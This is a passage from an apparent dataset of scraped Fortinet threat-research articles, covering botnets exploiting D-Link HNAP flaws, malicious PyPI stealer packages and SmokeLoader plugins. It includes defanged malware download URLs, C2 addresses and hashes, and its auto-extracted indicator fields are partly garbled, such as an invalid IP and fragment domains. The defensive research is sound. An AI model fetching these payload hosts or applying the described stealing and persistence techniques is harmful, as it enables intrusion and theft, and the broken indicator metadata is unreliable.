assistance of the open-sourceTDiscoverproject. Finally, we evaluate anomalies as part of the composite alert. An alleged attack may exhibit characteristics indicative of malicious reconnaissance or privilege escalation. However, it's crucial to confirm this through anomaly detection. Identifying illicit usage of valid credentials in the cloud can be a nuanced and difficult task. This poses a considerable challenge when it comes to detection, as the vast majority of attacks in the cloud involve compromised credentials. While the attack detailed in this blog had various atomic indicators specific to the actors’ tactics and techniques, most attacks do not exhibit these unique characteristics. To achieve higher accuracy, it becomes more critical to correlate weaker signals involving aspects that attackers cannot control. For example, while attackers can easily control their source IP and user agent, theycannotcontrol whether it is anomalous to the environment. Similarly, they cannot control the APIs or sequence of APIs needed to carry out their objectives. By leveraging these as signals to a composite alerting mechanism, one can achieve a much higher level of detection efficacy. Cloud detection and response(CDR) is a crucial component in addressing cloud identity compromises such as the one documented here. With over 80% of attacks in the cloud involving compromised credentials, the effectiveness of your CDR solution can directly dictate the severity of a cloud attack. Lacework FortiCNAPPoffers comprehensive CDR protection with our innovative composite alerting technology. Cloud identity compromises can be difficult to isolate as they often blend in with legitimate activity. Lacework FortiCNAPP can evaluate numerous weak signals together through composite alerting, culminating in a much higher detection efficacy than point detection alone. Lacework FortiCNAPP also integrates other essential components, such asCIEMfor informing the blast-radius of a compromised identity. Read moreabout how Lacework FortiCNAPP can secure your cloud environment. cloud security Business and Technology Business and Technology Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/catching-ec2-grouper-no-indicators-required",
      "scraped_at": "2025-07-20T13:44:26.524166",
      "indicators": {
        "ip_address": [
          "4.1.90.0",
          "4.1.534.0"
        ],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.2569373072970195
    }
  },
  {
    "id": "Fortinet_30473",
    "source": "Fortinet",
    "title": "Botnets Continue to Target Aging D-Link Vulnerabilities",
    "text": "FortiGuard Labs Threat Research Affected Platforms:D-Link DIR-645 Wired/Wireless Router Rev. Ax with firmware 1.04b12 and earlier. D-Link DIR-806 devices. D-Link GO-RT-AC750 GORTAC750_revA_v101b03 and GO-RT-AC750_revB_FWv200b02. D-Link DIR-845L router v1.01KRb03 and beforeImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High FortiGuard Labs noticed a spike in the activity of two different botnets in October and November of 2024. One was the Mirai variant “FICORA,” and the other was the Kaiten variant “CAPSAICIN.” These botnets are frequently spread through documented D-Link vulnerabilities that allow remote attackers to execute malicious commands via a GetDeviceSettings action on the HNAP (Home Network Administration Protocol) interface. This HNAP weakness was first exposed almost a decade ago, with numerous devices affected by a variety of CVE numbers, including CVE-2015-2051, CVE-2019-10891, CVE-2022-37056, and CVE-2024-33112. According to our IPS telemetry, attackers frequently reuse older attacks, which accounts for the continued spread of the “FICORA” and “CAPSAICIN” botnets to victim hosts and infected targets. This article looks at their infected traffic and offers insights into these botnets. The attackers we identified spreading the “FICORA” botnet triggered the incident from 185[.]191[.]126[.]213 and 185[.]191[.]126[.]248, which are servers located in the Netherlands. Because this latest “FICORA” attack targeted many countries around the world, we speculate that this was not a targeted attack. “CAPSAICIN,” unlike “FICORA,” was only intensely active over two days—October 21 and 22, 2024. East Asian countries bore the brunt of those incidents by attackers actively spreading the “CAPSAICIN” botnet. The “FICORA” botnet downloads a shell script named “multi,” executes the script, and then removes it after execution. The shell script “multi” uses multiple strategies to download the malware “FICORA,” such as “wget,” “ftpget,” “curl,” and “tftp.” This downloader script first kills all processes with the same file extension as the malware “FICORA.” It then downloads and executes its various malware by targeting different Linux architectures, including “arc,” “arm,” “arm5,” “arm6,” “arm7,” “i486,” “i586,” “i686,” “m68k,” “mips,” “mipsel,” “powerpc,” “powerpc-440fp,” and “sparc.” The following analysis is based on “la.bot.arm7.” “FICORA” encodes its configuration with the ChaCha20 encryption algorithm. This configuration includes its C2 server domain and a unique string. The scanner in “FICORA” includes a hard-coded username and password for its brute force attack function. The malware also embeds a shell script with hexadecimal ASCII characters and constructs it during the scanner's execution. The shell script tries to identify any process containing the keyword “dvrHelper,” which is probably another malware and kills it. The malware “FICORA” is a variant of the Mirai malware. It can be identified by its similar architecture. It also includes DDoS attack functions using protocols like “UDP,” “TCP,” and “DNS.” The malware “CAPSAICIN”’s downloader is delivered from 87[.]10[.]220[.]221. The shell script “bins.sh” downloads and executes the malware “CAPSAICIN” with prefix file name “yakuza” targeting different Linux architectures, including “arm,” “arm5,” “arm6,” “arm7,” “i586,” “i686,” “m68k,” “mips,” “mipsel,” “ppc,” “sparc,” and “x86.” We will focus on “yakuza.x86” for the following analysis. Once we execute the malware, it pops up the string “CAPSAICIN” where the malware variant name is given. The malware kills known botnet processes to ensure it is the only botnet executing on the victim host. “CAPSAICIN” establishes a connection socket with its C2 server, “192[.]110[.]247[.]46,” and sends the victim host’s OS information and the nickname given by the malware back to the C2 server. It waits for a command from the C2 server to execute numerous functions listed below. Using its “PRIVMSG” function, “CAPSAICIN” sets up environment variables for more functions the C2 server can conduct using the following commands. In addition to the above commands, the “PRIVMSG” function can trigger DDoS attacks using the following commands from the C2 server. In addition to these attack functions, the malware includes a help message for each function to remind the attacker of needed parameters. The malware “CAPSAICIN” seems to be a variant based on the Keksec group’s botnets. According to hard-coded information found in version 17.0.0 of the malware developed by the Keksec group, we surmise that “CAPSAICIN” was developed based on that version. Although the weaknesses exploited in this attack had been exposed and patched nearly a decade ago, these attacks have remained continuously active worldwide. FortiGuard Labs discovered that “FICORA” and “CAPSAICIN” spread through this weakness. Because of this, it is crucial for every enterprise to regularly update the kernel of their devices and maintain comprehensive monitoring. These steps will help reduce the likelihood of malware being deployed through this vulnerability. The malware described in this report is detected and blocked byFortiGuard Antivirusas: ELF/Gafgyt. ST!trELF/Gafgyt. C!trELF/Gafgyt. AEA!trBASH/TrojanDownloader. SH!trBASH/Mirai. AEH!tr.dldrELF/Mirai. A!trELF/Mirai. CTQ!trELF/Mirai. CLY!trBASH/Agent. SHS!tr.dldr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 server. FortiGuard Labs provides IPS signature against attacks exploiting the following vulnerabilities: CVE-2015-2051: D-Link. Devices. HNAP. SOAPAction-Header. Command. ExecutionCVE-2019-10891: D-Link. Devices. HNAP. SOAPAction-Header. Command. ExecutionCVE-2022-37056: D-Link. Devices. HNAP. SOAPAction-Header. Command. ExecutionCVE-2024-33112: D-Link. Devices. HNAP. SOAPAction-Header. Command. Execution We also suggest that organizations go through Fortinet’sfree cybersecurity trainingmodule:Fortinet Certified Fundamentals(FCF) in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp://103[.]149[.]87[.]69/multihxxp://103[.]149[.]87[.]69/la.bot.archxxp://103[.]149[.]87[.]69/la.bot.armhxxp://103[.]149[.]87[.]69/la.bot.arm5hxxp://103[.]149[.]87[.]69/la.bot.arm6hxxp://103[.]149[.]87[.]69/la.bot.arm7hxxp://103[.]149[.]87[.]69/la.bot.m68khxxp://103[.]149[.]87[.]69/la.bot.mipshxxp://103[.]149[.]87[.]69/la.bot.mipselhxxp://103[.]149[.]87[.]69/la.bot.powerpchxxp://103[.]149[.]87[.]69/la.bot.sh4hxxp://103[.]149[.]87[.]69/la.bot.sparc hxxp://87[.]11[.]174[.]141/bins.shhxxp://pirati[.]abuser[.]eu/yakuza.yak.shhxxp://pirati[.]abuser[.]eu/yakuza.arm5hxxp://pirati[.]abuser[.]eu/yakuza.arm6hxxp://pirati[.]abuser[.]eu/yakuza.arm7hxxp://pirati[.]abuser[.]eu/yakuza.i586hxxp://pirati[.]abuser[.]eu/yakuza.i686hxxp://pirati[.]abuser[.]eu/yakuza.m68khxxp://pirati[.]abuser[.]eu/yakuza.mipshxxp://pirati[.]abuser[.]eu/yakuza.mipselhxxp://pirati[.]abuser[.]eu/yakuza.ppchxxp://pirati[.]abuser[.]eu/yakuza.sparchxxp://pirati[.]abuser[.]eu/yakuza.x86hxxp://87[.]10[.]220[.]221/bins.shhxxp://87[.]10[.]220[.]221/yakuza.shhxxp://87[.]10[.]220[.]221/yakuza.arm4hxxp://87[.]10[.]220[.]221/yakuza.arm5hxxp://87[.]10[.]220[.]221/yakuza.arm6hxxp://87[.]10[.]220[.]221/yakuza.arm7hxxp://87[.]10[.]220[.]221/yakuza.i586hxxp://87[.]10[.]220[.]221/yakuza.i686hxxp://87[.]10[.]220[.]221/yakuza.m68khxxp://87[.]10[.]220[.]221/yakuza.mipshxxp://87[.]10[.]220[.]221/yakuza.mipselhxxp://87[.]10[.]220[.]221/yakuza.ppchxxp://87[.]10[.]220[.]221/yakuza.sparchxxp://87[.]10[.]220[.]221/yakuza.x86 103[.]149[.]87[.]69ru[.]coziest[.]lolf[.]codingdrunk[.]ccwww[.]codingdrunk[.]ineighteen[.]piratenineteen[.]libre75cents[.]libre2joints[.]librefortyfivehundred[.]dyn21savage[.]dynimaverygoodbadboy[.]librele[.]codingdrunk[.]in87[.]11[.]174[.]141pirati[.]abuser[.]eu87[.]10[.]220[.]22145[.]86[.]86[.]60194[.]110[.]247[.]46 f71dc58cc969e79cb0fdfe5163fbb9ed4fee5e13cc9407a11d231601ee4c6e23ea83411bd7b6e5a7364f7b8b9018f0f17f7084aeb58a47736dd80c99cfeac7f148a04c7c33a787ef72f1a61aec9fad87d6bd9c49542f52af7e029ac83475f45d18c92006951f93a77df14eca6430f32389080838d97c9e47364bf82f6c21a907 9b161a32d89f9b19d40cd4c21d436c1daf208b5d159ffe1df7ad5fd1a57610e5faeea9d5091384195e87caae9dd88010c9a2b3b2c88ae9cac8d79fd94f250e9f10d7aedc963ea77302b967aad100d7dd90d95abcdb099c5a0a2df309c52c32b87f6912de8bef9ced5b9018401452278570b4264bb1e935292575f2c3a0616ec4a06fd0b8936f5b2370db5f7ec933d53bd8a1bf5042cdc5c052390d1ecc7c0e07764a03bf28f9eec50a1bd994308e977a64201fbe5d41337bdcc942c74861bcd3df176fb8cfbc7512c77673f862e73833641ebb0d43213492c168f99302dcd5e3ac2df391ede03df27bcf238077d2dddcde24cd86f16202c5c51ecd31b7596a68ca3f6dce945ccad5a50ea01262b2d42171f893632fc5c5b8ce4499990e978e5bafee245b6f999f6b9d0dd997436df5f2abfb3c8d2a8811ff57e3c21637207d62ec508df7cb142a639b0c33f710d5e49c29a5a578521b6306bee28012aadde4a8 8349ba17f028b6a17aaa09cd17f1107409611a0734e06e6047ccc33e8ff669b0b3ad8409d82500e790e6599337abe4d6edf5bd4c6737f8357d19edd82c88b064ec87dc841af77ec2987f3e8ae316143218e9557e281ca13fb954536aa9f9caf1784c9711eadceb7fedf022b7d7f00cff7a75d05c18ff726e257602e3a3ccccc1bde6ef047e0880ac7ef02e56eb87d5bc39116e98ef97a5b1960e9a55cea5082bc7be8d1b8948e1cb095d46376ced64367718ed2d9270c2fc99c7052a9d1ffed74600703535e35b464f0198a1fa95e3668a0c956ab68ce7b719c28031d69b86ff6e3ef9404817e168c974000205b27723bc93abd7fbf0581c16bb5d2e1c5c6e4a32e66b87f47245a892b102b7141d3845540b270c278e221f502807758a4e5dee540c00e6c0b53332128b605b0d5e0926db0560a541bb13448d094764844763dfb74dbd02b7ebb51700f3c5900283e46570fe497f9b415d25a029623118073519148f6b990fc1f1903287cd5c20276664b332dd3ba8d58f2bf8c26334c93c3af5464e2f1faab2a40db44f118f7c3d1f9b300297fe6ced83fabe87563fc82efe95b699cd64b9895cdcc325d7dd96c9eca623d3ec0247d20f39323547132c8fa63b1007f5613a91a5d4170f28e24bfa704c8a63d95a2b4d033ff2bff7e2fe3dcffe7a815d4ca3771de8a71cde2bdacf951bf48ea5854eb0a2af5db7d13ad51c44abd6a2a22000d68d79caeae482d8cf092c2d84d55dccee05e179a961c72f77b1ba7ab36a93f009058e60c8a45b900c1c7ae38c96005a43a39e45be9dc7af9d6da8803abfe19cdc6c0c41acfeb210a2361cab96d5926b2c43e5eb3b589a6ed189ad7b29053306f194ca75021952f97f894d8eae6d2e1d02939df37b62d3845bfdb759704cf55b9fa439d6f7a36821a50178e9d73ddc5407ff340460c054d7defc54aaa49b7b4f1e71623c42bc77bb7aa40534bcb7312da511b041799bf0e1a63ee71ca1d5a53c4379c3015c74af2b18c1d9285ac1a48d515f9b7827e4f900a61bde FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/botnets-continue-to-target-aging-d-link-vulnerabilities",
      "scraped_at": "2025-07-20T13:44:34.569253",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ins",
          "r",
          "akuza",
          "a"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [
          "CVE-2024-33112",
          "CVE-2019-10891",
          "CVE-2015-2051",
          "CVE-2022-37056"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.7112970711297071
    }
  },
  {
    "id": "Fortinet_90321",
    "source": "Fortinet",
    "title": "Analyzing Malicious Intent in Python Code: A Case Study",
    "text": "FortiGuard Labs Threat Research Affected platforms:All platforms where PyPI packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, etc. Severity level:High Fortinet's AI-driven OSS malware detection system recently identified two malicious packages: Zebo-0.1.0 on November 16, 2024, and Cometlogger-0.1 on November 24, 2024. Malicious software often masquerades as legitimate code, hiding its harmful features behind complex logic and obfuscation. In this analysis, we examine the Python scripts behind these two packages, outline their malicious behaviors, and provide insights into their potential impact. The Zebo-0.1.0 script is a typical example of malware, with functions designed for surveillance, data exfiltration, and unauthorized control. It uses libraries like pynput and ImageGrab, along with obfuscation techniques, indicating clear malicious intent. The Cometlogger-0.1 script also shows signs of malicious behavior, including dynamic file manipulation, webhook injection, stealing information, and anti-VM checks. Zebo-0.1.0 is structured to perform various tasks that violate user privacy and security. Its main components include: Obfuscation:bypass detection mechanismsKeylogging:Capturing every keystroke typed by the user. Screen Capturing:Periodic screenshots of the user's desktop. Data Exfiltration:Uploading sensitive information (keystrokes, screenshots, etc.) to a remote server. Persistence Mechanism:Ensuring the malware re-executes upon system startup. Using obfuscation intentionally hides the true functionality, making it harder for users or security systems to understand what the code is doing. In this example, if the script or its components are obfuscated, it could hide malicious behavior, such as unauthorized data collection or system manipulation. Obfuscation can also be used to bypass security measures, potentially allowing malware to run undetected, which poses serious risks to both the user’s privacy and system integrity. The code uses hex-encoded strings (e.g., \\x68\\x74\\x74...) to hide the URL of the server it communicates with. It employs a command and control mechanism via HTTP requests to a remote server, which is used to manage the malware's behavior and collect stolen data. This obfuscation is a clear sign of malicious intent, as it seeks to bypass detection mechanisms during code review or automated scans. The use of the pynput library enables the script to log every keystroke made by the user. This feature is implemented through the following functions: Screen capturing can secretly record the user's screen, potentially violating their privacy and leading to unauthorized access to sensitive information. In the provided code, the post-installation script could be used to implement such functionality, allowing an attacker to monitor the user's activities without their consent. This is considered malicious behavior, as it can be used to steal personal information or perform other harmful actions, and it can lead to significant security risks, including data breaches and legal consequences. Using data exfiltration in this code is dangerous because it involves secretly collecting and transferring sensitive data from the user's system without their knowledge or consent. The post-installation script (i_am_cute()) can be used for unauthorized data access, potentially sending private information to a remote server. This could violate privacy, compromise security, and result in legal consequences for the software developer or distributor if the behavior is discovered, as it may be seen as a form of hacking or data theft. Logs and screenshots are sent to a Firebase database, exposing the user’s sensitive data to unauthorized parties. This is executed through HTTP PUT requests: To ensure it runs every time the system starts, the malware: The code provided raises several red flags indicative of potential malicious activity. Webhook Manipulation:The code dynamically requests a \"webhook\" from the user and embeds it into Python files like `Comet.py` and `Exela.py.’Information Theft:Steals tokens, passwords, and accounts from various platforms (Discord, Steam, Instagram, Twitter, etc.)Anti-VM Detection:Virtualization environments to evade analysis or sandboxing. Dynamic File Modification:The scripts modify Python files at runtime, a method that can enable malicious code injection for exploitation during execution. Persistence:Maintain long-term presence on the victim’s system. Security Risks: Injecting a webhook URL directly into the code allows for potential manipulation by unauthorized users, opening the door to malicious attacks. If attackers alter the webhook URL, it could redirect sensitive data to malicious servers, compromising security. Data Integrity: Allowing dynamic changes to webhooks during runtime can result in unintentional modifications, leading to incorrect or inconsistent data being sent. This could affect the system's functionality and lead to miscommunication between services. Malicious Exploitation: By hardcoding the webhook injection in multiple places, this approach can be exploited to execute malicious code. Since the code can be easily modified and reused, attackers could send harmful payloads through the webhook, potentially damaging systems or stealing data. The script repeatedly prompts users for a webhook, dynamically injecting it into files Injected webhooks could: Send sensitive information to a remote server. Facilitate command-and-control (C2) operations, allowing an attacker to issue commands remotely. The script from comet.py poses significant risks by violating user privacy through the collection of saved passwords, session cookies, and browsing history, which can be exploited to impersonate users, steal financial data, or compromise accounts. For organizations, this malware threatens unauthorized access to corporate accounts and data breaches, potentially leading to severe legal and financial consequences. Additionally, by targeting cookies from platforms like Instagram, TikTok, and Twitter, it enables account hijacking for spam, scams, or identity theft. Attackers often use anti-VM techniques to identify if their code is running in a sandbox or virtual machine, commonly used by researchers or security tools. The code checks for common virtualization indicators such as \"VMware\" and \"VirtualBox\". If such indicators are found, the code terminates execution to avoid detection. This allows attackers to bypass security monitoring in controlled environments. The Fake Error Message can trick users into running the malware code. Security Concerns: The code modifies files based on user inputs, potentially altering sensitive data like webhooks. This opens the door for malicious exploitation if an attacker provides malicious input or manipulates the file content. Data Integrity Risks: The use of replace operations without validation can lead to unintentional changes or corruption of files, especially if the files are being used by other processes or applications concurrently. Malware Risks: The integration with UPX, which compresses executables, raises concerns regarding the execution of malicious code. The UPX tool is commonly used to obfuscate malware, making it harder for security tools to detect it. The code modifies external files (Comet.py and Exela.py) without verifying their content or purpose: Security Risks: UPX can obfuscate the code, making it harder for security tools to analyze the executable. This could lead to undetected malicious behavior if used in malicious software. Compatibility Issues: UPX compression might cause problems with certain antivirus software or system configurations, as some security tools may flag compressed executables as suspicious, leading to false positives. Performance Impact: While UPX reduces file size, the decompression at runtime could introduce delays, affecting the performance of the application, especially if it's used excessively in critical areas of the code. The frequent invocation of utils/upx.exe using subprocess.call is highly suspicious: Continuous exception loops can lead to several problems, such as consuming excessive CPU resources, causing system freezes, and degrading performance. They may also obscure the root cause of the issue, making debugging more difficult. If exceptions are raised without proper handling, the program becomes unresponsive and harder to maintain. The script employs an infinite loop to persist in the user's environment: Disconnect from the Internet: Immediately isolate the infected system to prevent further data exfiltration. Run Antivirus Tools: Use reputable antivirus software to detect and remove the malware. Reformat the System: If the infection persists, reformat the system and reinstall the OS. Code Review: Always verify third-party scripts and executables before running them. Network Monitoring: Implement firewalls and intrusion detection systems to identify suspicious network activity. Education: Train users to recognize phishing attempts and avoid executing unverified scripts. This malicious Python script (Zebo-0.1.0) is a textbook example of malware, exhibiting functionalities designed for surveillance, data exfiltration, and unauthorized control. Its sophisticated use of libraries like pynput and ImageGrab, coupled with obfuscation techniques, demonstrates a clear intent to harm or exploit users. Such scripts highlight the importance of cybersecurity awareness and robust defensive measures. The script (Cometlogger-0.1) exhibits several hallmarks of malicious intent, including dynamic file manipulation, webhook injection, steal information, ANTI-VM. While some features could be part of a legitimate tool, the lack of transparency and suspicious functionality make it unsafe to execute. Always scrutinize code before running it and avoid interacting with scripts from unverified sources. FortiGuard AntiVirusdetects the malicious files identified in this report as zebo_0.1.0: Python/Agent. BZ!trrunner.py:Python/Agent. BZ!trCometlogger_0.1: Python/Agent. APQ!trcomet.py: Python/Agent. APQ!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. TheFortiGuard Web FilteringService detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report that may operate as dependencies in users' projects in test phases, and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Package/file name 4aeb0211bd6d9e7c74c09ac67812465f2a8e90e25fe04b265b7f289deea5db21 Python/Agent. BZ!tr zebo_0.1.0/runner.py 4aeb0211bd6d9e7c74c09ac67812465f2a8e90e25fe04b265b7f289deea5db21 Python/Agent. BZ!tr cometlogger_0.1 839d0cfcc52a130add70239b943d8c82c4234b064d6f996eeaae142f05cc9e85 Python/Agent. APQ!tr cometlogger_0.1/comet.py e01c61dc52514b011c83c293cf19092c40cb606a28a87675b4f896be5afebed2 Python/Agent. APQ!tr FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/analyzing-malicious-intent-in-python-code",
      "scraped_at": "2025-07-20T13:44:41.457672",
      "indicators": {
        "ip_address": [],
        "domain": [
          "omet",
          "px",
          "rcomet",
          "rrunner",
          "ubprocess",
          "xela",
          "unner"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "e01c61dc52514b011c83c293cf19092c40cb606a28a87675b4f896be5afebed2",
          "4aeb0211bd6d9e7c74c09ac67812465f2a8e90e25fe04b265b7f289deea5db21",
          "839d0cfcc52a130add70239b943d8c82c4234b064d6f996eeaae142f05cc9e85"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.3265839320705421
    }
  },
  {
    "id": "Fortinet_42929",
    "source": "Fortinet",
    "title": "Fortinet Contributes to Major Cybercrime Operation Arrests",
    "text": "FortiGuard Labs Threat Research Earlier this week, the International Criminal Police Organization (INTERPOL) and the African Union Mechanism for Police Cooperation (AFRIPOL)announcedthat the organizations have identified and arrested members of cybercrime groups operating across Africa. These individuals specialize in ransomware, digital extortion, online scams, and business email compromise (BEC) attacks. INTERPOL and AFRIPOL activities related to this effort, called Operation Serengeti, were supported by numerous partners, including Fortinet, and research from theCybercrime Atlas. The Cybercrime Atlas is a collaboration initiated by the World Economic Forum’sPartnership Against Cybercrime, in which cybercrime experts use open-source research to map cybercriminal activities and identify joint public and private sector responses to cybercrime. Fortinet is a launch partner of the Cybercrime Atlas, which has been in operation for a year. Separately, Fortinet, a longtime INTERPOL partner, was named a private contributing partner in Operation Serengeti for playing a vital role in sharing intelligence, supporting analysis, and disrupting criminal activities. As a result of Operation Serengeti, authorities across 19 participating countries arrested 1,006 suspects and dismantled nearly 135,000 malicious infrastructures and networks. The arrests follow months of international police collaboration, acting on information initially shared by partners, including the Cybercrime Atlas. This most recent effort identified and monitored these threat actors, leading to the arrests. Information provided by participating countries of ongoing cases with INTERPOL fed into 65 cyber analytical reports to ensure actions on the ground were intelligence-led and focused on the most significant actors. Seven private sector partners also played a vital role by sharing intelligence, supporting analysis, and disrupting criminal activities. These partners provided on-site support and offered around-the-clock remote assistance to patch vulnerabilities and secure critical infrastructure for the participating member countries. Operation Serengeti disrupted: These cybercrime operations resulted in a combined monetary loss of almost $193 million among numerous victims. The Cybercrime Atlas, which became operational earlier this year, was created to drive real impact and a coordinated effort to create a chain of disruption in the world of cybercrime. It will enable the entire cybersecurity community to become more resilient and effective at stopping cybercrime on a global scale. The Cybercrime Atlas comprises experts using open-source research to map cybercriminal activities and identify joint public and private sector responses to cybercrime. The group’s members currently include more than 20 law enforcement agencies, private-sector security companies, and incident responders, non-governmental organizations, financial institutions, and academic partners. In itsfirst year of operation, Cybercrime Atlas contributors shared more than 10,000 community-vetted and actionable data points and supported two cross-border cybercrime disruption efforts. They created seven comprehensive intelligence packages on emerging threats that were shared with law enforcement so that this actionable data could be operationalized. These intelligence packages created by Cybercrime Atlas contributed directly to the success of Operation Serengeti. Fortinet has been a trusted partner to INTERPOL since 2015, and officially became an INTERPOL Gateway partner in 2018. This ongoing collaboration has resulted in greater threat intelligence standards and protocols implemented across the industry and impactful global cybercriminal takedowns and disrupting criminal activities. In 2022,FortiGuard Labsprovided evidentiary support toINTERPOLand African Member countries as part of theAfrica Cyber Surge Operation(ASCO) to help detect, investigate, and disrupt cybercrime through coordinated law enforcement activities, utilizing INTERPOL platforms, tools, and channels in close cooperation with AFRIPOL. As a part of that effort, FortiGuard Labs provided actionable threat intelligence over six months, consisting ofbotnet,command and control (C2), andmalwareinfrastructure research, including C2, malware, and botnet victims in Africa. This enabled member countries to identify more than 1,000 malicious IP addresses, dark web markets, and individual threat actors. Turning the tide against cybercrime requires a culture of collaboration, transparency, and accountability on a larger scale. No single organization can effectively halt cybercrime alone. These arrests are a strong example of how public-private partnerships can impact the disruption of large-scale cybercrime activities, leading to a safer, more resilient society. Every organization has a place in the chain of disruption against cyberthreats. Creating ongoing collaboration opportunities with high-profile, well-respected organizations from both the public and private sectors is a fundamental aspect of Fortinet’s commitment to enhancing cyber resilience around the globe. By working together, we can make meaningful progress in disrupting adversary operations. cybercrime,derek manky FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/fortinet-contributes-to-major-cybercrime-operation-arrests",
      "scraped_at": "2025-07-20T13:44:49.412835",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.11204481792717087
    }
  },
  {
    "id": "Fortinet_97622",
    "source": "Fortinet",
    "title": "SmokeLoader Attack Targets Companies in Taiwan",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In September 2024, FortiGuard Labs observed an attack using the notorious SmokeLoader malware to target companies in Taiwan, including those in manufacturing, healthcare, information technology, and other sectors. SmokeLoader is well-known for its versatility and advanced evasion techniques, and its modular design allows it to perform a wide range of attacks. While SmokeLoader primarily serves as a downloader to deliver other malware, in this case, it carries out the attack itself by downloading plugins from its C2 server. Figure 2 shows a phishing email used in this campaign. The sender claims the attached malicious file is a quotation and includes a list of special instructions. While this email is persuasive, as it uses native words and phrases, these phishing emails are sent to multiple recipients with almost the same content. Even the recipient's name (the redaction in the file name) is not changed when sent to other companies. This has been observed in other attack chains of this campaign. In addition, the font and color of the email sign-off and telephone number are different from the main body, which suggests that the text may have been copied from elsewhere. Regardless of which it uses, the third stage uses a VBS file to launch the malware loader, AndeLoader, and the final payload is an identical file of SmokeLoader. CVE-2017-0199 is a vulnerability in Microsoft Office that exploits an OLE2-embedded link object. When a victim opens the crafted file, a malicious document is automatically downloaded and executed. The file attached to the phishing email is protected, and the object containing the malicious link is hidden in a sheet. CVE 2017-11882 is an RCE (Remote Code Execution) vulnerability in the equation editor in Microsoft Office. The shellcode contains a decryption algorithm and encrypted data. After the decryption, the shellcode gets the necessary APIs and downloads the VBS file for the next stage with theURLDownloadToFilefunction. The HTA file contains VBS code that is encoded using URL-encoded several times. After decoding, we see a VBS script with numerous spaces inserted between symbols and variables. Additionally, long variable names are used to frustrate analysis. The VBS script executes a snippet of PowerShell code, which downloads the VBS file for AndeLoader. Below is the deobfuscated PowerShell code. It downloads a steganographic image that contains base64-encoded data of the injector and extracts the data enclosed by<<BASE64_START>>and<<BASE64_END>>. After this, the data is decoded into the injector and itsdnlib. IO. Home. VAImethod, which receives six arguments: download link of the data for SmokeLoader, flag for persistence, file path, filename, injection target, and an unused argument. In this case, the persistence feature is not used, so the second, third, and fourth arguments are just filled withdestivado, which translates to “disabled” in English. TheClass. Startmethod combines all VBS files in the current working path of cmd.exe into a VBS file whose path and filename are specified by the third and fourth arguments ofTools. Ande,respectively. The file path is written to a new value namedPathin theHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Runregistry key to make the VBS file execute automatically when the system starts up. If this feature is used, it enables the VBS file downloaded in the previous stage to persist. After this, the TXT file specified by the first argument ofTools. Andeis downloaded, and its data is deobfuscated to get SmokeLoader, which is later injected intoRegAsm.exe. The following process of injection is commonly used: Below is SmokeLoader's execution flow. This section focuses on the plugins downloaded from its C2 server. Figure 14 shows that, though the response is404 Not Found, it still contains the payload for the attack. The payload contains configurations and the encrypted data for plugins: In this case, it contains configurations for Plugin 4, 5 (fgclearcookies), 8, and 9 (keylog_rules). This will be introduced later. Nine plugins are received from the C2 server, including three individual plugins and three plugins with 32-bit and 64-bit versions. According to the plugin's architecture, SmokeLoader uses a loop to sequentially inject these plugins intoexplorer.exe. SmokeLoader creates a suspended process ofexplorer.exeand writes encrypted data of the plugin and decryption algorithm along with a snippet of shellcode used to call the decryption algorithm. After this, it changes the code at the start of the entry point of explorer.exe into a jump to the shellcode and callsResumeThreadto execute the plugin. Below is the plugin list: Steals login credentials, FTP credentials, cookies, autofill data from browsers, email software, and FTP client Steals login credentials from Firefox and Thunderbird. The function is the same as what Plugin 1 uses. Read data from email software Injects its code into the browser and sets a hook to steal data The 64-bit version of Plugin 4 Injects its code into email software, browser, and FTP client and sets a hook to steal data The 64-bit version of Plugin 6 Injects its code into explorer.exe or processes specified by C2 server and sets a hook to steal data The 64-bit version of Plugin 8 This plugin uses a loop to sequentially execute functions for the target software. The functions can be categorized into the following types according to the target: This plugin leverages functions in vaultcli.dll to get login credentials from Internet Explorer. Credential Manager is a feature in the Windows system that is used to store passwords. 